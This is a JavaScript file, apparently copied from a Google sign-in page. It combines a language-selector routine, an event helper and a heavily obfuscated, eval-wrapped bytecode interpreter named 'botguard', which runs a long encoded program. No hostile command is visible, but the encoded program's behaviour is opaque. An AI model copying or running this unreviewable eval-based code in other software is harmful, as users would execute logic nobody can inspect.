(function(){
  var splitByFirstChar = function(toBeSplit, splitChar) {
  var index = toBeSplit.indexOf(splitChar);
  if (index >= 0) {
  return [toBeSplit.substring(0, index),
  toBeSplit.substring(index + 1)];
  }
  return [toBeSplit];
  }
  var langChooser_parseParams = function(paramsSection) {
  if (paramsSection) {
  var query = {};
  var params = paramsSection.split('&');
  for (var i = 0; i < params.length; i++) {
              var param = splitByFirstChar(params[i], '=');
              if (param.length == 2) {
                query[param[0]] = param[1];
              }
            }
            return query;
          }
          return {};
        }
        var langChooser_getParamStr = function(params) {
          var paramsStr = [];
          for (var a in params) {
            paramsStr.push(a + "=" + params[a]);
          }
          return paramsStr.join('&');
        }
        var langChooser_currentUrl = window.location.href;
        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
        var langChooser_currentPath = match[1];
        var langChooser_params = langChooser_parseParams(match[3]);
        var langChooser_fragment = match[5];

        var langChooser = document.getElementById('lang-chooser');
        var langChooserWrap = document.getElementById('lang-chooser-wrap');
        var langVisControl = document.getElementById('lang-vis-control');
        if (langVisControl && langChooser) {
          langVisControl.style.display = 'inline';
          langChooser.onchange = function() {
            langChooser_params['lp'] = 1;
            langChooser_params['hl'] = encodeURIComponent(this.value);
            var paramsStr = langChooser_getParamStr(langChooser_params);
            var newHref = langChooser_currentPath + "?" + paramsStr;
            if (langChooser_fragment) {
              newHref = newHref + "#" + langChooser_fragment;
            }
            window.location.href = newHref;
          };
        }
      })();
	  
	  /*************************************************************************************/
	    var gaia_attachEvent = function(element, event, callback) {
  if (element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
	   /*************************************************************************************/ 
(function(){eval('var g,k=true,m=null,p=false,q=this,u="",v=void 0,w=Array.prototype,aa=Date.now||function(){return+new Date},x=function(a){return(a=q.document)?a.documentMode:v},y=function(a,b){return a<b?-1:a>b?1:0},z=function(a,b,c,d,e){c=a.split("."),d=q,c[0]in d||!d.execScript||d.execScript("var "+c[0]);for(;c.length&&(e=c.shift());)c.length||b===v?d=d[e]?d[e]:d[e]={}:d[e]=b},ba=w.indexOf?function(a,b,c){return w.indexOf.call(a,b,c)}:function(a,b,c){if(c=c==m?0:0>c?Math.max(0,a.length+c):c,"string"==typeof a)return"string"==typeof b&&1==b.length?a.indexOf(b,c):-1;for(;c<a.length;c++)if(c in a&&a[c]===b)return c;return-1},A=function(a,b,c){if(b=typeof a,"object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;if(c=Object.prototype.toString.call(a),"[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==b&&"undefined"==typeof a.call)return"object";return b},B=/\\b(?:MSIE|rv)[: ]([^\\);]+)(\\)|;)/.exec(q.navigator?q.navigator.userAgent:m),u=B?B[1]:"",ca=x(),da=ca>parseFloat(u)?String(ca):u,ea={},fa=q.document,C=function(a,b,c,d,e,f,h,l,n,s,r,t){if(!(b=ea[a])){for(b=0,c=String(da).replace(/^[\\s\\xa0]+|[\\s\\xa0]+$/g,"").split("."),d=String(a).replace(/^[\\s\\xa0]+|[\\s\\xa0]+$/g,"").split("."),e=Math.max(c.length,d.length),f=0;0==b&&f<e;f++){h=c[f]||"",l=d[f]||"",n=RegExp("(\\\\d*)(\\\\D*)","g"),s=RegExp("(\\\\d*)(\\\\D*)","g");do{if(r=n.exec(h)||["","",""],t=s.exec(l)||["","",""],0==r[0].length&&0==t[0].length)break;b=y(0==r[1].length?0:parseInt(r[1],10),0==t[1].length?0:parseInt(t[1],10))||y(0==r[2].length,0==t[2].length)||y(r[2],t[2])}while(0==b)}b=ea[a]=0<=b}return b},ga=fa?x()||("CSS1Compat"==fa.compatMode?parseInt(da,10):5):v,D=(C("9"),new function(){aa()},m),E=m,G=m,H=9<=ga,ha=function(a){if(!D)for(D={},E={},G={},a=0;65>a;a++)D[a]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(a),E[D[a]]=a,G[a]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.".charAt(a)},ia=function(a,b,c,d,e){for(a=a.replace(/\\r\\n/g,"\\n"),b=[],d=c=0;d<a.length;d++)e=a.charCodeAt(d),128>e?b[c++]=e:(2048>e?b[c++]=e>>6|192:(b[c++]=e>>12|224,b[c++]=e>>6&63|128),b[c++]=e&63|128);return b},ja=!C("9"),I=(C("8"),C("9"),function(a,b){this.type=a,this.currentTarget=this.target=b,this.defaultPrevented=p}),J=(I.prototype.preventDefault=function(){this.defaultPrevented=k},function(a,b,c,d){I.call(this,a?a.type:""),this.relatedTarget=this.currentTarget=this.target=m,this.charCode=this.keyCode=this.button=this.screenY=this.screenX=this.clientY=this.clientX=this.offsetY=this.offsetX=0,this.metaKey=this.shiftKey=this.altKey=this.ctrlKey=p,this.Y=this.state=m,a&&(c=this.type=a.type,this.currentTarget=b,d=a.relatedTarget,this.target=a.target||a.srcElement,d||("mouseover"==c?d=a.fromElement:"mouseout"==c&&(d=a.toElement)),this.relatedTarget=d,this.Y=a,this.button=a.button,this.ctrlKey=a.ctrlKey,this.altKey=a.altKey,this.shiftKey=a.shiftKey,this.metaKey=a.metaKey,this.state=a.state,this.screenX=a.screenX||0,this.screenY=a.screenY||0,this.keyCode=a.keyCode||0,this.offsetX=a.offsetX!==v?a.offsetX:a.layerX,this.offsetY=a.offsetY!==v?a.offsetY:a.layerY,this.clientX=a.clientX!==v?a.clientX:a.pageX,this.clientY=a.clientY!==v?a.clientY:a.pageY,this.charCode=a.charCode||("keypress"==c?a.keyCode:0),a.defaultPrevented&&this.preventDefault())}),ka=(function(){function a(){}a.prototype=I.prototype,J.pa=I.prototype,J.prototype=new a,J.ta=function(a,c,d,e){return e=Array.prototype.slice.call(arguments,2),I.prototype[c].apply(a,e)}}(),J.prototype.preventDefault=function(a){if(J.pa.preventDefault.call(this),a=this.Y,a.preventDefault)a.preventDefault();else if(a.returnValue=p,ja)try{if(a.ctrlKey||112<=a.keyCode&&123>=a.keyCode)a.keyCode=-1}catch(b){}},"closure_listenable_"+(1E6*Math.random()|0)),la=0,ma=function(a){try{return!(!a||!a[ka])}catch(b){return p}},K=function(a){this.src=a,this.l={},this.M=0},na=function(a){a.s=k,a.k=m,a.t=m,a.src=m,a.K=m},oa=function(a,b,c,d,e){this.k=a,this.t=m,this.src=b,this.type=c,this.K=e,this.capture=!!d,this.key=++la,this.s=this.L=p},L=(K.prototype.add=function(a,b,c,d,e,f,h,l){f=this.l[a],f||(f=this.l[a]=[],this.M++);t:{for(h=0;h<f.length;++h)if(l=f[h],!l.s&&l.k==b&&l.capture==!!d&&l.K==e)break t;h=-1}return-1<h?(a=f[h],c||(a.L=p)):(a=new oa(b,this.src,a,!!d,e),a.L=c,f.push(a)),a},"closure_lm_"+(1E6*Math.random()|0)),M={},pa=0,qa=function(a){return a=a[L],a instanceof K?a:m},ta=function(a,b){return a=sa,b=H?function(c){return a.call(b.src,b.k,c)}:function(c){if(c=a.call(b.src,b.k,c),!c)return c}},sa=function(a,b,c,d,e){if(a.s)return k;if(!H){if(!(c=b))t:{for(d=q,c=["window","event"];e=c.shift();)if(d[e]!=m)d=d[e];else{c=m;break t}c=d}return c=new J(c,this),d=k,d=ua(a,c)}return ua(a,new J(b,this))},N=function(a,b,c,d,e,f,h){if("array"==A(b))for(f=0;f<b.length;f++)N(a,b[f],c,d,e);else if(c=va(c),ma(a))a.sa(b,c,d,e);else{if(!b)throw Error("Invalid event type");if(f=!!d,!f||H)(h=qa(a))||(a[L]=h=new K(a)),c=h.add(b,c,p,d,e),c.t||(d=ta(),c.t=d,d.src=a,d.k=c,a.addEventListener?a.addEventListener(b,d,f):a.attachEvent(b in M?M[b]:M[b]="on"+b,d),pa++)}},ua=function(a,b,c,d,e,f,h,l,n,s){if(c=a.k,d=a.K||a.src,a.L&&"number"!=typeof a&&a&&!a.s)if(e=a.src,ma(e))e.ra(a);else if(f=a.type,h=a.t,e.removeEventListener?e.removeEventListener(f,h,a.capture):e.detachEvent&&e.detachEvent(f in M?M[f]:M[f]="on"+f,h),pa--,f=qa(e)){if(h=a.type,l=h in f.l)l=f.l[h],n=ba(l,a),(s=0<=n)&&w.splice.call(l,n,1),l=s;l&&(na(a),0==f.l[h].length&&(delete f.l[h],f.M--)),0==f.M&&(f.src=m,e[L]=m)}else na(a);return c.call(d,b)},wa="__closure_events_fn_"+(1E9*Math.random()>>>0),O=function(a,b){a.o=("E:"+b.message+":"+b.stack).slice(0,2048)},va=function(a){return"function"==A(a)?a:a[wa]||(a[wa]=function(b){return a.handleEvent(b)})},xa=function(a,b){for(b=Array(a);a--;)b[a]=255*Math.random()|0;return b},P=function(a,b){return a[b]<<24|a[b+1]<<16|a[b+2]<<8|a[b+3]},ya=function(a,b){a.T.push(a.c.slice()),a.c[a.b]=v,Q(a,a.b,b)},za=function(a,b,c){return c=function(){return a},b=function(){return c()},b.ca=function(b){a=b},b},Ba=function(a,b,c,d){return function(){if(!d||a.w)return Q(a,a.W,arguments),Q(a,a.m,c),Aa(a,b)}},R=function(a,b,c,d){for(c=[],d=b-1;0<=d;d--)c[b-1-d]=a>>8*d&255;return c},Aa=function(a,b,c,d){return c=a.a(a.b),a.f&&c<a.f.length?(Q(a,a.b,a.f.length),ya(a,b)):Q(a,a.b,b),d=a.B(),Q(a,a.b,c),d},T=function(a,b,c,d){for(b={},b.I=a.a(S(a)),b.J=S(a),c=S(a)-1,d=S(a),b.self=a.a(d),b.r=[];c--;)d=S(a),b.r.push(a.a(d));return b},Y=function(a,b){return b<=a.ka?b==a.h||b==a.d||b==a.g||b==a.u?a.p:b==a.W||b==a.Q||b==a.R||b==a.m?a.F:b==a.G?a.i:4:[1,2,4,a.p,a.F,a.i][b%a.la]},Ca=function(a,b,c,d){try{for(d=0;84941944608!=d;)a+=(b<<4^b>>>5)+b^d+c[d&3],d+=2654435769,b+=(a<<4^a>>>5)+a^d+c[d>>>11&3];return[a>>>24,a>>16&255,a>>8&255,a&255,b>>>24,b>>16&255,b>>8&255,b&255]}catch(e){throw e;}},Q=function(a,b,c){if(b==a.b||b==a.n)a.c[b]?a.c[b].ca(c):a.c[b]=za(c);else if(b!=a.d&&b!=a.g&&b!=a.h||!a.c[b])a.c[b]=Da(c,a.a);b==a.v&&(a.C=v,Q(a,a.b,a.a(a.b)+4))},S=function(a,b,c){if(b=a.a(a.b),!(b in a.f))throw a.e(a.fa),a.D;return a.C==v&&(a.C=P(a.f,b-4),a.H=v),a.H!=b>>3&&(a.H=b>>3,c=[0,0,0,a.a(a.v)],a.ga=Ca(a.C,a.H,c)),Q(a,a.b,b+1),a.f[b]^a.ga[b%8]},Da=function(a,b,c,d,e,f,h,l,n){return l=Z,e=Z.prototype,f=e.B,h=e.X,n=e.e,d=function(){return c()},c=function(a,r,t){for(t=0,a=d[e.N],r=a===b,a=a&&a[e.N];a&&a!=f&&a!=h&&a!=l&&a!=n&&20>t;)t++,a=a[e.N];return c[e.oa+r+!(!a+(t>>2))]},d[e.S]=e,c[e.na]=a,a=v,d},$=function(a,b,c,d,e,f){for(e=a.a(b),b=b==a.g?function(b,c,d,f){try{c=e.length,d=c-4>>3,e.ja!=d&&(e.ja=d,d=(d<<3)-4,f=[0,0,0,a.a(a.P)],e.ia=Ca(P(e,d),P(e,d+4),f)),e.push(e.ia[c&7]^b)}catch(r){throw r;}}:function(a){e.push(a)},d&&b(d&255),f=0,d=c.length;f<d;f++)b(c[f])},Z=function(a,b,c,d,e,f,h,l){try{if(this.j=2048,this.c=[],Q(this,this.b,0),Q(this,this.n,0),Q(this,this.v,0),Q(this,this.h,[]),Q(this,this.d,[]),Q(this,this.Q,"object"==typeof window?window:q),Q(this,this.R,this),Q(this,this.A,0),Q(this,this.O,0),Q(this,this.P,0),Q(this,this.g,xa(4)),Q(this,this.u,[]),Q(this,this.m,{}),this.w=k,a&&"!"==a[0])this.o=a;else{for(ha(),b=E,c=[],d=0;d<a.length;){if(e=b[a.charAt(d++)],f=d<a.length?b[a.charAt(d)]:0,++d,h=d<a.length?b[a.charAt(d)]:0,++d,l=d<a.length?b[a.charAt(d)]:0,++d,e==m||f==m||h==m||l==m)throw Error();c.push(e<<2|f>>4),64!=h&&(c.push(f<<4&240|h>>2),64!=l&&c.push(h<<6&192|l))}(this.f=c)&&this.f.length?(this.T=[],this.B()):this.e(this.Z)}}catch(n){O(this,n)}};g=Z.prototype,g.b=0,g.v=1,g.h=2,g.n=3,g.d=4,g.G=5,g.W=6,g.U=8,g.Q=9,g.R=10,g.A=11,g.O=12,g.P=13,g.g=14,g.u=15,g.m=16,g.ka=17,g.$=15,g.ha=12,g.aa=10,g.ba=42,g.la=6,g.i=-1,g.p=-2,g.F=-3,g.Z=17,g.da=21,g.q=22,g.ma=30,g.fa=31,g.ea=33,g.D={},g.N="caller",g.S="toString",g.oa=34,g.na=36,Z.prototype.a=function(a,b){if(b=this.c[a],b===v)throw this.e(this.ma,0,a),this.D;return b()},Z.prototype.wa=function(a,b,c,d){d=a[(b+2)%3],a[b]=a[b]-a[(b+1)%3]-d^(1==b?d<<c:d>>>c)},Z.prototype.va=function(a,b,c,d){if(3==a.length){for(c=0;3>c;c++)b[c]+=a[c];for(c=0,d=[13,8,13,12,16,5,3,10,15];9>c;c++)b[3](b,c%3,d[c])}},Z.prototype.xa=function(a,b){b.push(a[0]<<24|a[1]<<16|a[2]<<8|a[3]),b.push(a[4]<<24|a[5]<<16|a[6]<<8|a[7]),b.push(a[8]<<24|a[9]<<16|a[10]<<8|a[11])},Z.prototype.e=function(a,b,c,d){d=this.a(this.n),a=[a,d>>8&255,d&255],c!=v&&a.push(c),0==this.a(this.h).length&&(this.c[this.h]=v,Q(this,this.h,a)),b&&3<this.j&&(c="",b.message&&(c+=b.message),b.stack!=v&&(c+=": "+b.stack),c=c.slice(0,this.j-3),this.j-=c.length+3,c=ia(c),$(this,this.g,R(c.length,2).concat(c),this.ha))},g.V=[function(){},function(a,b,c,d,e){b=S(a),c=S(a),d=a.a(b),b=Y(a,b),e=Y(a,c),e==a.i||e==a.p?d=""+d:0<b&&(1==b?d&=255:2==b?d&=65535:4==b&&(d&=4294967295)),Q(a,c,d)},function(a,b,c,d,e,f,h,l,n){if(b=S(a),c=Y(a,b),0<c){for(d=0;c--;)d=d<<8|S(a);Q(a,b,d)}else if(c!=a.F){if(d=S(a)<<8|S(a),c==a.i)if(c="",a.c[a.G]!=v)for(e=a.a(a.G);d--;)f=e[S(a)<<8|S(a)],c+=f;else{for(c=Array(d),e=0;e<d;e++)c[e]=S(a);for(d=c,c=[],f=e=0;e<d.length;)h=d[e++],128>h?c[f++]=String.fromCharCode(h):191<h&&224>h?(l=d[e++],c[f++]=String.fromCharCode((h&31)<<6|l&63)):(l=d[e++],n=d[e++],c[f++]=String.fromCharCode((h&15)<<12|(l&63)<<6|n&63));c=c.join("")}else for(c=Array(d),e=0;e<d;e++)c[e]=S(a);Q(a,b,c)}},function(a){S(a)},function(a,b,c,d){b=S(a),c=S(a),d=S(a),c=a.a(c),b=a.a(b),Q(a,d,b[c])},function(a,b,c){b=S(a),c=S(a),b=a.a(b),Q(a,c,A(b))},function(a,b,c,d,e){b=S(a),c=S(a),d=Y(a,b),e=Y(a,c),c!=a.h&&(d==a.i&&e==a.i?(a.c[c]==v&&Q(a,c,""),Q(a,c,a.a(c)+a.a(b))):e==a.p&&(0>d?(b=a.a(b),d==a.i&&(b=ia(""+b)),c!=a.d&&c!=a.g&&c!=a.u||$(a,c,R(b.length,2)),$(a,c,b)):0<d&&$(a,c,R(a.a(b),d))))},function(a,b,c){b=S(a),c=S(a),Q(a,c,function(a){return eval(a)}(a.a(b)))},function(a,b,c){b=S(a),c=S(a),Q(a,c,a.a(c)-a.a(b))},function(a,b){b=T(a),Q(a,b.J,b.I.apply(b.self,b.r))},function(a,b,c){b=S(a),c=S(a),Q(a,c,a.a(c)%a.a(b))},function(a,b,c,d,e){b=S(a),c=a.a(S(a)),d=a.a(S(a)),e=a.a(S(a)),b=a.a(b),N(b,c,Ba(a,d,e,k))},function(a,b,c,d){b=S(a),c=S(a),d=S(a),a.a(b)[a.a(c)]=a.a(d)},function(a,b,c,d,e){b=T(a),c=b.r,d=b.self,e=b.I;switch(c.length){case 0:c=d[e]();break;case 1:c=d[e](c[0]);break;case 2:c=d[e](c[0],c[1]);break;case 3:c=d[e](c[0],c[1],c[2]);break;default:a.e(a.q);return}Q(a,b.J,c)},function(a,b,c){b=S(a),c=S(a),Q(a,c,a.a(c)+a.a(b))},function(a,b,c){b=S(a),c=S(a),0!=a.a(b)&&Q(a,a.b,a.a(c))},function(a,b,c,d){b=S(a),c=S(a),d=S(a),a.a(b)==a.a(c)&&Q(a,d,a.a(d)+1)},function(a,b,c,d){b=S(a),c=S(a),d=S(a),a.a(b)>a.a(c)&&Q(a,d,a.a(d)+1)},function(a,b,c,d){b=S(a),c=S(a),d=S(a),Q(a,d,a.a(b)<<c)},function(a,b,c,d){b=S(a),c=S(a),d=S(a),Q(a,d,a.a(b)|a.a(c))},function(a,b){b=a.a(S(a)),ya(a,b)},function(a,b,c,d){if(b=a.T.pop()){for(c=S(a);0<c;c--)d=S(a),b[d]=a.c[d];a.c=b}else Q(a,a.b,a.f.length)},function(a,b,c,d){b=S(a),c=S(a),d=S(a),Q(a,d,(a.a(b)in a.a(c))+0)},function(a,b,c,d){b=S(a),c=a.a(S(a)),d=a.a(S(a)),Q(a,b,Ba(a,c,d))},function(a,b,c){b=S(a),c=S(a),Q(a,c,a.a(c)*a.a(b))},function(a,b,c,d){b=S(a),c=S(a),d=S(a),Q(a,d,a.a(b)>>c)},function(a,b,c,d){b=S(a),c=S(a),d=S(a),Q(a,d,a.a(b)||a.a(c))},function(a,b,c,d,e){b=T(a),c=b.r,d=b.self,e=b.I;switch(c.length){case 0:c=new d[e];break;case 1:c=new d[e](c[0]);break;case 2:c=new d[e](c[0],c[1]);break;case 3:c=new d[e](c[0],c[1],c[2]);break;case 4:c=new d[e](c[0],c[1],c[2],c[3]);break;default:a.e(a.q);return}Q(a,b.J,c)},function(a,b,c,d,e,f){if(b=S(a),c=S(a),d=S(a),e=S(a),b=a.a(b),c=a.a(c),d=a.a(d),a=a.a(e),"object"==A(b)){for(f in e=[],b)e.push(f);b=e}for(e=0,f=b.length;e<f;e+=d)c(b.slice(e,e+d),a)}],Z.prototype.ua=function(a){return(a=window.performance)&&a.now?function(){return a.now()|0}:function(){return+new Date}}(),Z.prototype.qa=function(a,b){return b=this.X(),a&&a(b),b},Z.prototype.B=function(a,b,c,d,e,f){try{for(b=2001,c=v,d=0,a=this.f.length;--b&&(d=this.a(this.b))<a;)try{Q(this,this.n,d),e=S(this)%this.V.length,(c=this.V[e])?c(this):this.e(this.da,0,e)}catch(h){h!=this.D&&((f=this.a(this.A))?(Q(this,f,h),Q(this,this.A,0)):this.e(this.q,h))}b||this.e(this.ea)}catch(l){try{this.e(this.q,l)}catch(n){O(this,n)}}return this.a(this.m)},Z.prototype.X=function(a,b,c,d,e,f,h,l,n,s,r,t,U,ra,V,W,X,F){if(this.o)return this.o;try{for(this.w=p,b=this.a(this.d).length,c=this.a(this.g).length,d=this.j,this.c[this.U]&&Aa(this,this.a(this.U)),e=this.a(this.h),0<e.length&&$(this,this.d,R(e.length,2).concat(e),this.$),f=this.a(this.O)&255,f-=this.a(this.d).length+4,h=this.a(this.g),4<h.length&&(f-=h.length+3),0<f&&$(this,this.d,R(f,2).concat(xa(f)),this.aa),4<h.length&&$(this,this.d,R(h.length,2).concat(h),this.ba),l=[3].concat(this.a(this.d)),ha(),s=[],e=0;e<l.length;e+=3)r=l[e],U=(t=e+1<l.length)?l[e+1]:0,V=(ra=e+2<l.length)?l[e+2]:0,f=r>>2,X=V&63,h=(r&3)<<4|U>>4,W=(U&15)<<2|V>>6,ra||(X=64,t||(W=64)),s.push(G[f],G[h],G[W],G[X]);if(n=s=s.join("").replace(/\\./g,""))n="!"+n;else for(n="",s=0;s<l.length;s++)F=l[s][this.S](16),1==F.length&&(F="0"+F),n+=F;a=n,this.j=d,this.w=k,this.a(this.d).length=b,this.a(this.g).length=c}catch(Ea){O(this,Ea),a=this.o}return a};try{N(window,"unload",function(){})}catch(Fa){}z("botguard.bg",Z),z("botguard.bg.prototype.invoke",Z.prototype.qa);')})()	   /*************************************************************************************/
	  document.bg = new botguard.bg('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